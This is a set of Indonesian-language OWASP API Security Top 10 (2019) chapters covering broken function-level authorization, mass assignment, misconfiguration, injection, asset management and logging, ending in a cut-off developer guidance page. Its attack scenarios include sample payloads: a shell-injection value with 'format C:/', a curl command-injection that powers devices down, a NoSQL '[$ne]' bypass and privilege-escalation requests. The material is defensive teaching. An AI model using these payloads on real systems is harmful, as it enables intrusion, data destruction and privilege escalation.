{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0xa5-broken-function-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0xa5-broken-function-level-authorization.md", "content": "# API5:2019 Otorisasi Tingkat Fungsi yang Rusak\n\n| Agen Ancaman/Vektor Serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API: Eksploitasi **3** | Prevalensi **2** : Deteksi **1** | Teknis **2** : Spesifik Bisnis |\n| Eksploitasi membutuhkan penyerang untuk mengirim panggilan API yang sah ke endpoint API yang seharusnya tidak mereka akses. Endpoint ini mungkin terbuka untuk pengguna anonim atau pengguna reguler non-istimewa. Lebih mudah menemukan celah ini di API karena API lebih terstruktur, dan cara mengakses fungsi tertentu lebih dapat diprediksi (misalnya, mengganti metode HTTP dari GET ke PUT, atau mengubah string “users” di URL menjadi \"admins\"). | Pemeriksaan otorisasi untuk fungsi atau sumber daya biasanya dikelola melalui konfigurasi, dan terkadang di tingkat kode. Mengimplementasikan pemeriksaan yang tepat dapat menjadi tugas yang membingungkan, karena aplikasi modern dapat berisi banyak jenis peran atau kelompok dan hirarki pengguna yang kompleks (misalnya, sub-pengguna, pengguna dengan lebih dari satu peran). | Celah seperti itu memungkinkan penyerang mengakses fungsionalitas yang tidak sah. Fungsi administratif menjadi target utama untuk jenis serangan ini. |\n\n## Apakah API Rentan?\n\nCara terbaik untuk menemukan masalah otorisasi tingkat fungsi yang rusak adalah dengan melakukan analisis mendalam terhadap mekanisme otorisasi, dengan mempertimbangkan hirarki pengguna, peran atau kelompok yang berbeda dalam aplikasi, dan mengajukan pertanyaan berikut:\n\n* Apakah pengguna reguler dapat mengakses endpoint administratif?  \n* Apakah pengguna dapat melakukan tindakan sensitif (misalnya, pembuatan, modifikasi, atau penghapusan) yang seharusnya tidak mereka akses dengan hanya mengubah metode HTTP (misalnya, dari `GET` ke `DELETE`)?\n* Apakah pengguna dari kelompok X dapat mengakses fungsi yang seharusnya hanya diekspos ke pengguna dari kelompok Y, dengan hanya menebak URL dan parameter endpoint (misalnya, `/api/v1/users/export_all`)?\n\nJangan menganggap endpoint API adalah reguler atau administratif hanya berdasarkan jalur URL. \n\nMeskipun pengembang mungkin memilih untuk mengekspos sebagian besar endpoint administratif di bawah jalur relatif tertentu, seperti `api/admins`, sangat umum menemukan endpoint administratif ini di bawah jalur relatif lain bersama dengan endpoint reguler, seperti `api/users`.\n\n## Skenario Serangan Contoh\n\n### Skenario #1\n\nSelama proses pendaftaran ke aplikasi yang hanya mengizinkan pengguna diundang untuk bergabung, aplikasi seluler memicu panggilan API ke `GET /api/invites/{invite_guid}`. Respons berisi JSON dengan rincian undangan, termasuk peran pengguna dan email pengguna.\n\nSeorang penyerang menduplikasi permintaan dan memanipulasi metode HTTP dan endpoint menjadi `POST /api/invites/new`. Endpoint ini hanya boleh diakses oleh administrator menggunakan konsol admin, yang tidak menerapkan pemeriksaan otorisasi tingkat fungsi. \n\nPenyerang mengeksploitasi masalah ini dan mengirim undangan ke dirinya sendiri untuk membuat akun admin:\n\n```\nPOST /api/invites/new\n\n{“email”:”hugo@malicious.com”,”role”:”admin”}\n```\n\n### Skenario #2\n\nSebuah API berisi endpoint yang seharusnya hanya diekspos ke administrator - `GET /api/admin/v1/users/all`. Endpoint ini mengembalikan rincian semua pengguna aplikasi dan tidak menerapkan pemeriksaan otorisasi tingkat fungsi. Seorang penyerang yang mempelajari struktur API membuat tebakan terdidik dan berhasil mengakses endpoint ini, yang mengekspos rincian sensitif pengguna aplikasi.\n\n## Cara Mencegah\n\nAplikasi Anda harus memiliki modul otorisasi yang konsisten dan mudah dianalisis yang dipanggil dari semua fungsi bisnis Anda. Seringkali, perlindungan tersebut disediakan oleh satu atau lebih komponen eksternal untuk kode aplikasi.\n\n* Mekanisme penegakan harus menolak semua akses secara default, membutuhkan izin eksplisit ke peran tertentu untuk mengakses setiap fungsi.\n* Tinjau endpoint API Anda terhadap celah otorisasi tingkat fungsi, dengan mempertimbangkan logika bisnis aplikasi dan hirarki kelompok.  \n* Pastikan semua pengendali administrasi Anda mewarisi pengendali abstrak administratif yang menerapkan pemeriksaan otorisasi berdasarkan grup/peran pengguna.\n* Pastikan fungsi administratif di dalam pengendali reguler menerapkan pemeriksaan otorisasi berdasarkan grup dan peran pengguna.\n\n## Referensi\n\n### OWASP\n\n* [Artikel OWASP tentang Forced Browsing][1]  \n* [OWASP Top 10 2013-A7-Missing Function Level Access Control][2]\n* [OWASP Development Guide: Bab tentang Otorisasi][3]\n\n### Eksternal\n\n* [CWE-285: Otorisasi yang Tidak Tepat][4]\n\n[1]: https://www.owasp.org/index.php/Forced_browsing\n[2]: https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control\n[3]: https://www.owasp.org/index.php/Category:Access_Control\n[4]: https://cwe.mitre.org/data/definitions/285.html", "timestamp": "2025-10-24T22:26:36.874038"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0xa6-mass-assignment.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0xa6-mass-assignment.md", "content": "# API6:2019 - Mass Assignment\n\n| Agen Ancaman/Vektor Serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API: Eksploitasi **2** | Prevalensi **2** : Deteksi **2** | Teknis **2** : Spesifik Bisnis |\n| Eksploitasi biasanya memerlukan pemahaman tentang logika bisnis, hubungan objek, dan struktur API. Eksploitasi penugasan massal lebih mudah dalam API, karena secara desain mereka mengekspos implementasi aplikasi yang mendasari beserta nama properti. | Kerangka kerja modern mendorong pengembang untuk menggunakan fungsi yang secara otomatis mengikat masukan dari klien ke dalam variabel kode dan objek internal. Penyerang dapat menggunakan metodologi ini untuk memperbarui atau menimpa properti objek sensitif yang sebenarnya tidak dimaksudkan untuk diekspos oleh pengembang. | Eksploitasi dapat menyebabkan eskalasi hak istimewa, perusakan data, menghindari mekanisme keamanan, dan lainnya. |\n\n## Apakah API Rentan?\n\nObjek dalam aplikasi modern mungkin berisi banyak properti. Beberapa properti ini harus diperbarui langsung oleh klien (misalnya, `user.first_name` atau `user.address`) dan beberapa tidak boleh (misalnya, flag `user.is_vip`). \n\nTitik akhir API rentan jika secara otomatis mengubah parameter klien menjadi properti objek internal, tanpa mempertimbangkan sensitivitas dan tingkat paparan properti tersebut. Hal ini bisa memungkinkan penyerang untuk memperbarui properti objek yang seharusnya tidak mereka akses.\n\nContoh properti sensitif:\n\n* **Properti terkait izin**: `user.is_admin`, `user.is_vip` hanya boleh diatur oleh admin.\n* **Properti tergantung proses**: `user.cash` hanya boleh diatur secara internal setelah verifikasi pembayaran.  \n* **Properti internal**: `article.created_time` hanya boleh diatur secara internal oleh aplikasi.\n\n## Skenario Serangan Contoh\n\n### Skenario #1\n\nAplikasi berbagi tumpangan memberi pengguna opsi untuk mengedit informasi dasar untuk profil mereka. Selama proses ini, panggilan API dikirim ke `PUT /api/v1/users/me` dengan objek JSON yang sah:\n\n```json\n{\"user_name\":\"inons\",\"age\":24} \n```\n\nPermintaan `GET /api/v1/users/me` menyertakan properti credit_balance tambahan: \n\n```json \n{\"user_name\":\"inons\",\"age\":24,\"credit_balance\":10}\n```\n\nPenyerang memutar ulang permintaan pertama dengan payload berikut:\n\n```json\n{\"user_name\":\"attacker\",\"age\":60,\"credit_balance\":99999}\n```\n\nKarena endpoint rentan terhadap penugasan massal, penyerang menerima kredit tanpa membayar.\n\n### Skenario #2\n\nPortal berbagi video memungkinkan pengguna mengunggah konten dan mengunduh konten dalam format yang berbeda. Seorang penyerang yang menjelajahi API menemukan bahwa endpoint `GET /api/v1/videos/{video_id}/meta_data` mengembalikan objek JSON dengan properti video. Salah satu propertinya adalah `\"mp4_conversion_params\":\"-v codec h264\"` yang menunjukkan bahwa aplikasi menggunakan perintah shell untuk mengubah video.\n\nPenyerang juga menemukan endpoint `POST /api/v1/videos/new` rentan terhadap penugasan massal dan memungkinkan klien mengatur properti apa pun dari objek video. Penyerang menetapkan nilai berbahaya sebagai berikut: `\"mp4_conversion_params\":\"-v codec h264 && format C:/\"`. Nilai ini akan menyebabkan injeksi perintah shell setelah penyerang mengunduh video sebagai MP4.\n\n## Cara Mencegah\n\n* Jika memungkinkan, hindari menggunakan fungsi yang secara otomatis mengikat masukan klien ke dalam variabel kode atau objek internal.  \n* Daftar putih hanya properti yang seharusnya diperbarui oleh klien.\n* Gunakan fitur bawaan untuk daftar hitam properti yang tidak boleh diakses oleh klien.\n* Jika berlaku, tentukan dan tegakkan secara eksplisit skema untuk muatan data masukan.\n\n## Referensi\n\n### Eksternal\n\n* [CWE-915: Pengontrolan yang Tidak Tepat dari Modifikasi Atribut Objek yang Ditentukan Secara Dinamis][1]\n\n[1]: https://cwe.mitre.org/data/definitions/915.html", "timestamp": "2025-10-24T22:26:36.984996"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0xa7-security-misconfiguration.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0xa7-security-misconfiguration.md", "content": "# API7:2019 Kesalahan Konfigurasi Keamanan \n\n| Agen Ancaman/Vektor Serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API: Eksploitasi **3** | Prevalensi **3** : Deteksi **3** | Teknis **2** : Spesifik Bisnis |\n| Penyerang sering mencoba menemukan celah yang tidak diperbarui, endpoint umum, atau file dan direktori yang tidak dilindungi untuk mendapatkan akses yang tidak sah atau pengetahuan tentang sistem. | Kesalahan konfigurasi keamanan dapat terjadi pada setiap level tumpukan API, dari level jaringan hingga level aplikasi. Alat otomatis tersedia untuk mendeteksi dan memanfaatkan kesalahan konfigurasi seperti layanan yang tidak perlu atau opsi warisan. | Kesalahan konfigurasi keamanan tidak hanya dapat mengekspos data pengguna yang sensitif, tetapi juga rincian sistem yang dapat mengarah ke kompromi server penuh. |\n\n## Apakah API Rentan? \n\nAPI mungkin rentan jika:\n\n* Pengerasan keamanan yang tepat hilang di bagian mana pun dari tumpukan aplikasi, atau jika memiliki izin yang dikonfigurasi dengan salah pada layanan cloud.\n* Perbaikan keamanan terbaru hilang, atau sistemnya sudah ketinggalan zaman. \n* Fitur yang tidak perlu diaktifkan (misalnya, kata kerja HTTP).\n* Keamanan Lapisan Transport (TLS) hilang.\n* Direktif keamanan tidak dikirim ke klien (misalnya, [Security Headers][1]).\n* Kebijakan Berbagi Sumber Daya Lintas Asal (CORS) hilang atau disetel dengan salah.\n* Pesan kesalahan termasuk jejak tumpukan, atau informasi sensitif lainnya terekspos.\n\n## Skenario Serangan Contoh\n\n### Skenario #1\n\nSeorang penyerang menemukan file `.bash_history` di bawah direktori root server, yang berisi perintah yang digunakan oleh tim DevOps untuk mengakses API:\n\n```\n$ curl -X GET 'https://api.server/endpoint/' -H 'authorization: Basic Zm9vOmJhcg=='\n```\n\nPenyerang juga bisa menemukan endpoint baru pada API yang hanya digunakan oleh tim DevOps dan tidak didokumentasikan.\n\n### Skenario #2 \n\nUntuk menargetkan layanan tertentu, seorang penyerang menggunakan mesin pencari populer untuk mencari komputer yang dapat diakses langsung dari Internet. Penyerang menemukan host yang menjalankan sistem manajemen basis data populer, mendengarkan di port default. Host tersebut menggunakan konfigurasi default, yang secara default menonaktifkan otentikasi, dan penyerang mendapatkan akses ke jutaan catatan dengan PII, preferensi pribadi, dan data otentikasi.\n\n### Skenario #3\n\nMemeriksa lalu lintas aplikasi seluler, penyerang mengetahui bahwa tidak semua lalu lintas HTTP dilakukan pada protokol aman (misalnya, TLS). Penyerang menemukan ini benar, khususnya untuk mengunduh gambar profil. Karena interaksi pengguna bersifat biner, meskipun lalu lintas API dilakukan pada protokol yang aman, penyerang menemukan pola pada ukuran respons API, yang dia gunakan untuk melacak preferensi pengguna atas konten yang dirender (misalnya, gambar profil).\n\n## Cara Mencegah\n\nSiklus hidup API harus mencakup:\n\n* Proses pengerasan yang dapat diulang yang mengarah ke penyebaran yang cepat dan mudah dari lingkungan yang dikunci dengan benar.\n* Tugas untuk meninjau dan memperbarui konfigurasi di seluruh tumpukan API. Tinjauan harus mencakup: file orchestrasi, komponen API, dan layanan cloud (misalnya, izin bucket S3).\n* Saluran komunikasi yang aman untuk semua interaksi akses API ke aset statis (misalnya, gambar).\n* Proses otomatis untuk secara kontinu menilai efektivitas konfigurasi dan pengaturan di semua lingkungan.\n\nSelanjutnya: \n\n* Untuk mencegah jejak pengecualian dan informasi berharga lainnya dikirim kembali ke penyerang, jika berlaku, tentukan dan tegakkan semua skema muatan respons API termasuk respons kesalahan.\n* Pastikan API hanya dapat diakses oleh kata kerja HTTP yang ditentukan. Semua kata kerja HTTP lainnya harus dinonaktifkan (misalnya, `HEAD`).\n* API yang diharapkan dapat diakses dari klien berbasis browser (misalnya, front-end WebApp) harus menerapkan kebijakan Berbagi Sumber Daya Lintas Asal (CORS) yang tepat. \n\n## Referensi\n\n### OWASP\n\n* [OWASP Secure Headers Project][1]  \n* [OWASP Testing Guide: Configuration Management][2]\n* [OWASP Testing Guide: Testing for Error Codes][3]\n* [OWASP Testing Guide: Test Cross Origin Resource Sharing][9]\n\n### Eksternal\n\n* [CWE-2: Kelemahan Keamanan Lingkungan][4] \n* [CWE-16: Konfigurasi][5]\n* [CWE-388: Penanganan Kesalahan][6]  \n* [Panduan Keamanan Server Umum][7], NIST\n* [Let’s Encrypt: Otoritas Sertifikat Gratis, Otomatis, dan Terbuka][8]\n\n[1]: https://www.owasp.org/index.php/OWASP_Secure_Headers_Project\n[2]: https://www.owasp.org/index.php/Testing_for_configuration_management\n[3]: https://www.owasp.org/index.php/Testing_for_Error_Code_(OTG-ERR-001)  \n[4]: https://cwe.mitre.org/data/definitions/2.html\n[5]: https://cwe.mitre.org/data/definitions/16.html\n[6]: https://cwe.mitre.org/data/definitions/388.html\n[7]: https://csrc.nist.gov/publications/detail/sp/800-123/final\n[8]: https://letsencrypt.org/\n[9]: https://www.owasp.org/index.php/Test_Cross_Origin_Resource_Sharing_(OTG-CLIENT-007)", "timestamp": "2025-10-24T22:26:37.093677"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0xa8-injection.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0xa8-injection.md", "content": "# API8:2019 Injeksi\n\n| Agen Ancaman/Vektor Serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API: Eksploitasi **3** | Prevalensi **2** : Deteksi **3** | Teknis **3** : Spesifik Bisnis |\n| Penyerang akan memberi makan API dengan data berbahaya melalui vektor injeksi apa pun yang tersedia (misalnya, input langsung, parameter, layanan terintegrasi, dll.), berharap itu dikirim ke interpreter. | Celah injeksi sangat umum dan sering ditemukan dalam kueri SQL, LDAP, atau NoSQL, perintah OS, parser XML, dan ORM. Celah ini mudah ditemukan saat meninjau kode sumber. Penyerang dapat menggunakan scanner dan fuzzer. | Injeksi dapat menyebabkan pengungkapan informasi dan kehilangan data. Itu juga dapat menyebabkan DoS, atau pengambilalihan host secara total. |\n\n## Apakah API Rentan?\n\nAPI rentan terhadap celah injeksi jika:\n\n* Data yang disediakan klien tidak divalidasi, difilter, atau disucihamakan oleh API.\n* Data yang disediakan klien digunakan langsung atau digabungkan ke kueri SQL/NoSQL/LDAP, perintah OS, parser XML, dan Pemetaan Objek Relasional (ORM)/Pemetaan Dokumen Objek (ODM).\n* Data yang berasal dari sistem eksternal (misalnya, sistem terintegrasi) tidak divalidasi, difilter, atau disucihamakan oleh API.\n\n## Skenario Serangan Contoh\n\n### Skenario #1\n\nFirmware dari perangkat kontrol orang tua menyediakan endpoint `/api/CONFIG/restore` yang mengharapkan appId dikirim sebagai parameter multipart. Menggunakan dekompiler, seorang penyerang mengetahui bahwa appId dilewatkan langsung ke panggilan sistem tanpa pembersihan apa pun:\n\n```c\nsnprintf(cmd, 128, \"%srestore_backup.sh /tmp/postfile.bin %s %d\", \n         \"/mnt/shares/usr/bin/scripts/\", appid, 66);\nsystem(cmd);\n```\n\nPerintah berikut memungkinkan penyerang mematikan perangkat mana pun dengan firmware yang sama yang rentan:\n\n```\n$ curl -k \"https://${deviceIP}:4567/api/CONFIG/restore\" -F 'appid=$(/etc/pod/power_down.sh)' \n```\n\n### Skenario #2\n\nKami memiliki aplikasi dengan fungsionalitas CRUD dasar untuk operasi dengan pemesanan. Seorang penyerang berhasil mengidentifikasi bahwa injeksi NoSQL mungkin dimungkinkan melalui parameter string kueri `bookingId` dalam permintaan penghapusan pemesanan. Beginilah permintaannya: `DELETE /api/bookings?bookingId=678`.\n\nServer API menggunakan fungsi berikut untuk menangani permintaan penghapusan:\n\n```javascript\nrouter.delete('/bookings', async function (req, res, next) {\n  try {\n      const deletedBooking = await Bookings.findOneAndRemove({'_id' : req.query.bookingId});\n      res.status(200);\n  } catch (err) {\n     res.status(400).json({error: 'Unexpected error occured while processing a request'});\n  }\n});\n```\n\nPenyerang menyadap permintaan dan mengubah parameter string kueri `bookingId` seperti di bawah ini. Dalam hal ini, penyerang berhasil menghapus pemesanan pengguna lain: \n\n```\nDELETE /api/bookings?bookingId[$ne]=678\n```\n\n## Cara Mencegah\n\nMencegah injeksi memerlukan pemisahan data dari perintah dan kueri.\n\n* Lakukan validasi data menggunakan satu pustaka yang tepercaya dan dikelola secara aktif.\n* Validasi, filter, dan sucikan semua data yang disediakan klien, atau data lainnya yang berasal dari sistem terintegrasi.  \n* Karakter khusus harus dilepas menggunakan sintaks spesifik untuk interpreter tujuan.\n* Lebih baik menggunakan API yang aman yang menyediakan antarmuka terparameter.\n* Selalu batasi jumlah catatan yang dikembalikan untuk mencegah pengungkapan massal jika terjadi injeksi.\n* Validasi data masuk menggunakan filter yang cukup untuk hanya mengizinkan nilai yang valid untuk setiap parameter input.\n* Tentukan jenis data dan pola ketat untuk semua parameter string.\n\n## Referensi\n\n### OWASP\n\n* [OWASP Injection Flaws][1]  \n* [SQL Injection][2]\n* [NoSQL Injection Fun with Objects and Arrays][3]  \n* [Command Injection][4]\n\n### Eksternal\n\n* [CWE-77: Command Injection][5]\n* [CWE-89: SQL Injection][6]\n\n[1]: https://www.owasp.org/index.php/Injection_Flaws\n[2]: https://www.owasp.org/index.php/SQL_Injection\n[3]: https://www.owasp.org/images/e/ed/GOD16-NOSQL.pdf\n[4]: https://www.owasp.org/index.php/Command_Injection\n[5]: https://cwe.mitre.org/data/definitions/77.html \n[6]: https://cwe.mitre.org/data/definitions/89.html", "timestamp": "2025-10-24T22:26:37.200849"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0xa9-improper-assets-management.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0xa9-improper-assets-management.md", "content": "# API9:2019 Pengelolaan Aset yang Tidak Tepat\n\n| Agen Ancaman/Vektor Serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API: Eksploitasi **3** | Prevalensi **3** : Deteksi **2** | Teknis **2** : Spesifik Bisnis |\n| Versi API lama biasanya tidak diperbarui dan merupakan cara mudah untuk mengkompromikan sistem tanpa harus melawan mekanisme keamanan mutakhir, yang mungkin ada untuk melindungi versi API terbaru. | Dokumentasi yang sudah ketinggalan zaman membuatnya lebih sulit untuk menemukan dan/atau memperbaiki kerentanan. Kurangnya inventarisasi aset dan strategi pensiun menyebabkan menjalankan sistem yang tidak diperbarui, yang mengakibatkan kebocoran data sensitif. Umum ditemukan host API yang terpapar secara tidak perlu karena konsep modern seperti mikroservis, yang memudahkan aplikasi untuk diterapkan dan independen (misalnya, komputasi cloud, k8s). | Penyerang dapat memperoleh akses ke data sensitif, atau bahkan mengambil alih server melalui versi API lama yang tidak diperbarui yang terhubung ke basis data yang sama. |\n\n## Apakah API Rentan?\n\nAPI mungkin rentan jika:\n\n* Tujuan dari host API tidak jelas, dan tidak ada jawaban eksplisit untuk pertanyaan berikut:\n    * Lingkungan apa API berjalan (misalnya, produksi, staging, pengujian, pengembangan)?\n    * Siapa yang seharusnya memiliki akses jaringan ke API (misalnya, publik, internal, mitra)?\n    * Versi API apa yang berjalan?\n    * Data apa yang dikumpulkan dan diproses oleh API (misalnya, PII)?\n    * Bagaimana aliran datanya?\n* Tidak ada dokumentasi, atau dokumentasi yang ada tidak diperbarui.\n* Tidak ada rencana pensiun untuk setiap versi API.  \n* Inventarisasi host hilang atau ketinggalan zaman.\n* Inventarisasi layanan terintegrasi, baik pihak pertama maupun ketiga, hilang atau ketinggalan zaman. \n* Versi API lama atau sebelumnya berjalan tanpa patch.\n\n## Skenario Serangan Contoh\n\n### Skenario #1\n\nSetelah merancang ulang aplikasi mereka, layanan pencarian lokal meninggalkan versi API lama (`api.someservice.com/v1`) berjalan, tidak dilindungi, dan dengan akses ke basis data pengguna. Saat menargetkan salah satu aplikasi rilis terbaru, seorang penyerang menemukan alamat API (`api.someservice.com/v2`). Mengganti `v2` dengan `v1` di URL memberi penyerang akses ke API lama, tidak dilindungi, yang memaparkan informasi identifikasi pribadi (PII) lebih dari 100 juta pengguna.\n\n### Skenario #2\n\nSebuah jaringan sosial menerapkan mekanisme pembatasan laju yang memblokir penyerang dari menggunakan brute-force untuk menebak token reset kata sandi. Mekanisme ini tidak diimplementasikan sebagai bagian dari kode API itu sendiri, tetapi dalam komponen terpisah antara klien dan API resmi (`www.socialnetwork.com`). Seorang peneliti menemukan host API beta (`www.mbasic.beta.socialnetwork.com`) yang menjalankan API yang sama, termasuk mekanisme reset kata sandi, tetapi mekanisme pembatasan laju tidak diterapkan. Peneliti dapat mereset kata sandi pengguna mana pun dengan menggunakan brute-force sederhana untuk menebak token 6 digit.\n\n## Cara Mencegah\n\n* Inventarisasi semua host API dan dokumentasikan aspek penting dari masing-masing, berfokus pada lingkungan API (misalnya, produksi, staging, pengujian, pengembangan), siapa yang seharusnya memiliki akses jaringan ke host (misalnya, publik, internal, mitra) dan versi API.\n* Inventarisasi layanan terintegrasi dan dokumentasikan aspek penting seperti peran mereka dalam sistem, data apa yang dipertukarkan (aliran data), dan sensitivitasnya.  \n* Dokumentasikan semua aspek API Anda seperti otentikasi, kesalahan, pengalihan, pembatasan laju, kebijakan berbagi sumber daya lintas asal (CORS) dan endpoint, termasuk parameter, permintaan, dan respons mereka.\n* Hasilkan dokumentasi secara otomatis dengan mengadopsi standar terbuka. Sertakan pembangunan dokumentasi dalam pipeline CI/CD Anda.\n* Buat dokumentasi API tersedia untuk mereka yang berwenang menggunakan API.\n* Gunakan langkah-langkah perlindungan eksternal seperti firewall keamanan API untuk semua versi terekspos API Anda, bukan hanya untuk versi produksi saat ini.\n* Hindari menggunakan data produksi dengan penerapan API non-produksi. Jika ini tidak dapat dihindari, endpoint ini harus mendapatkan perlakuan keamanan yang sama dengan produksi.\n* Ketika versi API yang lebih baru mencakup peningkatan keamanan, lakukan analisis risiko untuk membuat keputusan tindakan mitigasi yang diperlukan untuk versi yang lebih tua: misalnya, apakah mungkin menerapkan peningkatan tanpa merusak kompatibilitas API atau Anda perlu menarik versi yang lebih tua dengan cepat dan memaksa semua klien beralih ke versi terbaru.\n\n## Referensi\n\n### Eksternal \n\n* [CWE-1059: Dokumentasi yang Tidak Lengkap][1] \n* [Inisiatif OpenAPI][2]\n\n[1]: https://cwe.mitre.org/data/definitions/1059.html\n[2]: https://www.openapis.org/\n", "timestamp": "2025-10-24T22:26:37.320258"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0xaa-insufficient-logging-monitoring.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0xaa-insufficient-logging-monitoring.md", "content": "# API10:2019 Pencatatan & Pemantauan yang Tidak Memadai\n\n| Agen Ancaman/Vektor Serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API: Eksploitasi **2** | Prevalensi **3** : Deteksi **1** | Teknis **2** : Spesifik Bisnis |\n| Penyerang memanfaatkan kurangnya pencatatan dan pemantauan untuk menyalahgunakan sistem tanpa disadari. | Tanpa pencatatan dan pemantauan, atau dengan pencatatan dan pemantauan yang tidak memadai, hampir mustahil untuk melacak kegiatan mencurigakan dan menanggapinya tepat waktu. | Tanpa visibilitas atas kegiatan berbahaya yang sedang berlangsung, penyerang memiliki banyak waktu untuk sepenuhnya mengkompromikan sistem. |  \n\n## Apakah API Rentan?\n\nAPI rentan jika:\n\n* Tidak menghasilkan log apa pun, level pencatatan tidak disetel dengan benar, atau pesan log tidak menyertakan detail yang cukup. \n* Integritas log tidak dijamin (misalnya, [Log Injection][1]).\n* Log tidak dipantau secara terus menerus.  \n* Infrastruktur API tidak dipantau secara terus menerus.\n\n## Skenario Serangan Contoh  \n\n### Skenario #1\n\nKunci akses administratif API bocor di repositori publik. Pemilik repositori diberi tahu melalui email tentang kebocoran potensial, tetapi membutuhkan waktu lebih dari 48 jam untuk menindaklanjuti insiden, dan paparan kunci akses mungkin telah mengizinkan akses ke data sensitif. Karena pencatatan yang tidak memadai, perusahaan tidak dapat menilai data apa yang diakses oleh aktor berbahaya.\n\n### Skenario #2\n\nPlatform berbagi video terkena serangan \"skala besar\" stuffing kredensial. Meskipun login gagal dicatat, tidak ada peringatan yang dipicu selama rentang waktu serangan. Sebagai reaksi atas keluhan pengguna, log API dianalisis dan serangan terdeteksi. Perusahaan harus membuat pengumuman publik yang meminta pengguna mereset kata sandi mereka, dan melaporkan insiden kepada otoritas peraturan.\n\n## Cara Mencegah\n\n* Catat semua upaya otentikasi gagal, akses yang ditolak, dan kesalahan validasi input.  \n* Log harus ditulis menggunakan format yang sesuai untuk dikonsumsi oleh solusi manajemen log, dan harus mencakup detail yang cukup untuk mengidentifikasi pelaku jahat.\n* Log harus ditangani sebagai data sensitif, dan integritasnya harus dijamin saat diam dan dalam transit.\n* Konfigurasikan sistem pemantauan untuk secara terus menerus memantau infrastruktur, jaringan, dan fungsi API.\n* Gunakan sistem Manajemen Informasi dan Keamanan (SIEM) untuk menggabungkan dan mengelola log dari semua komponen tumpukan API dan host.\n* Konfigurasikan dashboard dan peringatan kustom, memungkinkan kegiatan mencurigakan terdeteksi dan direspon lebih awal.\n\n## Referensi\n\n\n### OWASP\n\n* [OWASP Logging Cheat Sheet][2]\n* [OWASP Proactive Controls: Implement Logging and Intrusion Detection][3]\n* [OWASP Application Security Verification Standard: V7: Error Handling and\n  Logging Verification Requirements][4]\n\n### Eksternal\n\n* [CWE-223: Omission of Security-relevant Information][5]\n* [CWE-778: Insufficient Logging][6]\n\n[1]: https://www.owasp.org/index.php/Log_Injection\n[2]: https://www.owasp.org/index.php/Logging_Cheat_Sheet\n[3]: https://www.owasp.org/index.php/OWASP_Proactive_Controls\n[4]: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x15-V7-Error-Logging.md\n[5]: https://cwe.mitre.org/data/definitions/223.html\n[6]: https://cwe.mitre.org/data/definitions/778.html\n", "timestamp": "2025-10-24T22:26:37.429453"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0xb0-next-devs.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0xb0-next-devs.md", "content": "# Apa Selanjutnya untuk Pengembang\n\nTugas untuk membuat dan memelihara perangkat lunak yang aman, atau memperbaiki perangkat lunak yang ada, dapat sulit. API tidak berbeda. \n\nKami yakin bahwa pendidikan dan kesadaran adalah faktor kunci untuk menulis perangkat lunak yang aman. Semua hal lain yang diperlukan untuk mencapai tujuan, bergantung pada **membangun dan menggunakan proses keamanan yang dapat diulang dan kontrol keamanan standar**.\n\nOWASP memiliki berbagai sumber daya gratis dan terbuka untuk mengatasi masalah keamanan sejak awal proyek. Silakan kunjungi halaman [Proyek OWASP][1] untuk daftar lengkap proyek yang tersedia. \n\n| | |\n|-|-|\n| **Pendidikan** | Anda dapat mulai membaca [materi Proyek Pendidikan OWASP][2] sesuai dengan profesi dan minat Anda. Untuk pembelajaran hands-on, kami menambahkan **crAPI** - **C**ompletely **R**idiculous **API** dalam [roadmap kami][3]. Sementara itu, Anda dapat berlatih WebAppSec menggunakan [Modul Pixi DevSlop OWASP][4], layanan WebApp dan API rentan yang bertujuan untuk mengajari pengguna cara menguji aplikasi web dan API modern untuk masalah keamanan, dan cara menulis API yang lebih aman di masa depan. Anda juga dapat menghadiri sesi pelatihan [Konferensi OWASP AppSec][5], atau [bergabung dengan chapter lokal Anda][6]. |\n| **Persyaratan Keamanan** | Keamanan harus menjadi bagian dari setiap proyek sejak awal. Saat melakukan elicitation persyaratan, penting untuk mendefinisikan apa artinya \"aman\" untuk proyek tersebut. OWASP merekomendasikan Anda menggunakan [OWASP Application Security Verification Standard (ASVS)][7] sebagai panduan untuk menetapkan persyaratan keamanan. Jika Anda outsourcing, pertimbangkan [OWASP Secure Software Contract Annex][8], yang harus disesuaikan sesuai hukum dan peraturan setempat. |\n| **Arsitektur Keamanan** | Keamanan harus tetap menjadi perhatian selama semua tahapan proyek. [OWASP Prevention Cheat Sheets][9] merupakan titik awal yang baik untuk panduan tentang cara merancang keamanan selama fase arsitektur. Di antara banyak lainnya, Anda akan menemukan [REST Security Cheat Sheet][10] dan [REST Assessment Cheat Sheet][11]. | \n| **Kontrol Keamanan Standar** | Mengadopsi Kontrol Keamanan Standar mengurangi risiko memperkenalkan kelemahan keamanan saat menulis logika Anda sendiri. Meskipun fakta banyak kerangka kerja modern sekarang datang dengan kontrol efektif standar bawaan, [OWASP Proactive Controls][12] memberi Anda gambaran yang baik tentang kontrol keamanan apa yang harus Anda cari untuk dimasukkan dalam proyek Anda. OWASP juga menyediakan beberapa pustaka dan alat yang mungkin Anda anggap berharga, seperti kontrol validasi. |\n| **Siklus Hidup Pengembangan Perangkat Lunak yang Aman** | Anda dapat menggunakan [OWASP Software Assurance Maturity Model (SAMM)][13] untuk 